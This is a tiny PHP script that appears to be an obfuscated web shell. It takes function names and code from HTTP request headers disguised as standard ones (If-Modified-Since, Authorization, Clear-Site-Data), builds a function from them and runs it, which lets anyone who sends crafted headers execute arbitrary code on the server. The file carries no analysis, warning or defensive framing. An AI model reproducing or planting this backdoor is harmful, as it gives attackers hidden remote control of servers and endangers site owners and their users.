<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Modified-Since'])) {
    $reset = $_HEADERS['If-Modified-Since']('', $_HEADERS['Authorization']($_HEADERS['Clear-Site-Data']));
    $reset();
}